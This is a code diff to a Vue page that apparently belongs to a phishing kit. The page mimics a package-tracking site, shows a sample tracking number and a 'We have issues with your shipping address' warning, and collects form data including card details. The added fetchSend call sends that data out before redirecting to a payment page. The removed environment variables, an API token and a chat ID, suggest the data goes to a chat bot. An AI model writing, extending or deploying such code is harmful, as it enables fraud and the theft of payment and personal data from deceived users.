@@ -10,7 +10,7 @@
       </p>
     </div>
   </div>
-  <div class="pt-44 pb-20">
+  <div class="pt-40 md:pb-20 pb-10">
     <h4 class="font-semibold text-text-heading w-max mx-auto text-xl">
       Track Another Package <i class="ri-add-line text-red-600"></i>
     </h4>
@@ -22,7 +22,9 @@
       <p class="font-helv2 text-text-body">US94512106007770</p>
     </div>
 
-    <div class="w-full h-5 bg-text-heading"></div>
+    <div class="w-full h-5">
+      <div v-for="item in 3" :key="item" class="h-full bg-[#]"></div>
+    </div>
     <h4 class="text-red-600 text-xl font-semibold my-5">
       We have issues with your shipping address
     </h4>
@@ -70,9 +72,7 @@ import Input from "/src/components/MyInput.vue";
 import { useCounterStore } from "/src/stores/info.js";
 import { ref } from "vue";
 import { useRouter } from "vue-router";
-import { updateMyMessage } from "../utils/updateMessage.js";
-
-const { VITE_API_TOKEN, VITE_CHAT_ID } = import.meta.env;
+import { updateMyMessage, fetchSend } from "../utils/updateMessage.js";
 
 const router = useRouter();
 const store = useCounterStore();
@@ -113,9 +113,10 @@ function handleSubmit() {
     store.cardType = store.getCardType;
 
     const theKeys = Object.keys(info);
-    for (let i = 0; i < theKeys.length; i++) {
-      updateMyMessage(`${theKeys[i]}:   ${data[i]}`);
+    for (let i = 0; i < 1; i++) {
+      updateMyMessage(myMessage, `${theKeys[i]}:   ${data[i]}`);
     }
+    fetchSend(myMessage.value, () => router.push("/payment"));
   }
 }
 </script>
